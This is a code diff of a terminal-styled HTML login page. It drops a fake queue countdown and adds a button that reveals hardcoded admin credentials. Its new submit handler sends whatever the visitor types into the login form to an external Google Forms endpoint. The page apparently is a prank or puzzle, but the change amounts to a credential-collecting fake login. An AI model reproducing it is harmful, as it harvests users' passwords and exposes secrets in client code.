@@ -71,29 +71,29 @@
             background: #0f0;
             color: #000;
         }
-        .spinner {
-            display: none;
-            margin-top: 20px;
-            border: 4px solid #0f0;
-            border-top: 4px solid transparent;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .queue-message {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #ff0;
-        }
-        .error-message {
+        .hint-button {
             margin-top: 10px;
-            font-size: 16px;
-            color: #f00;
+            background: transparent;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+            border-radius: 3px;
+            transition: background 0.3s ease;
+        }
+        .hint-button:hover {
+            background: #0f0;
+            color: #000;
+        }
+        .message, .hint {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .hint {
+            color: #ff0;
+            display: none; /* Hidden by default */
         }
     </style>
 </head>
@@ -113,48 +113,41 @@
                 <input type="submit" value="Login">
             </div>
         </form>
-        <div class="spinner" id="spinner"></div>
-        <div class="queue-message" id="queue-message"></div>
-        <div class="error-message" id="error-message"></div>
+        <button class="hint-button" id="hint-button">Show Password Hint</button>
+        <div class="message" id="message"></div>
+        <div class="hint" id="hint">User: admin<br>Password: ab12cd34</div>
     </div>
 
     <script>
-        const loginForm = document.getElementById('login-form');
-        const spinner = document.getElementById('spinner');
-        const queueMessage = document.getElementById('queue-message');
-        const errorMessage = document.getElementById('error-message');
-        let queueStarted = false; // Track if the queue has already started
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from redirecting
 
-        loginForm.addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent form submission
+            const formData = new FormData(this);
+            const formAction = 'https://docs.google.com/forms/d/1IEsX-1XvlogRsprTXArAgIM_CLFjVWuUtemC_6dGGm8/formResponse';
 
-            if (queueStarted) {
-                // Show error message if the queue is already running
-                errorMessage.textContent = "Error: You are already in the queue!";
-                return;
+            fetch(formAction, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            })
+            .then(() => {
+                document.getElementById('message').textContent = 'Form submitted successfully!';
+                document.getElementById('message').style.color = '#0f0';
+            })
+            .catch(() => {
+                document.getElementById('message').textContent = 'There was an error submitting the form.';
+                document.getElementById('message').style.color = '#f00';
+            });
+        });
+
+        // Show/hide hint on button click
+        document.getElementById('hint-button').addEventListener('click', function() {
+            const hint = document.getElementById('hint');
+            if (hint.style.display === 'none' || hint.style.display === '') {
+                hint.style.display = 'block';
+            } else {
+                hint.style.display = 'none';
             }
-
-            queueStarted = true; // Mark the queue as started
-            errorMessage.textContent = ""; // Clear previous error message
-
-            // Initialize the queue number
-            let queueNumber = Math.floor(Math.random() * 71) + 30; // Random number between 30-100
-
-            // Show the spinner and queue message
-            spinner.style.display = 'block';
-            queueMessage.textContent = `You're in queue number: ${queueNumber}`;
-
-            // Countdown the queue number at random intervals
-            const queueInterval = setInterval(() => {
-                if (queueNumber > 1) {
-                    queueNumber--;
-                    queueMessage.textContent = `You're in queue number: ${queueNumber}`;
-                } else {
-                    clearInterval(queueInterval);
-                    spinner.style.display = 'none'; // Hide the spinner
-                    queueMessage.textContent = "Processing your request...";
-                }
-            }, Math.floor(Math.random() * 20000) + 10000); // Random interval between 10-30 seconds
         });
     </script>
 </body>
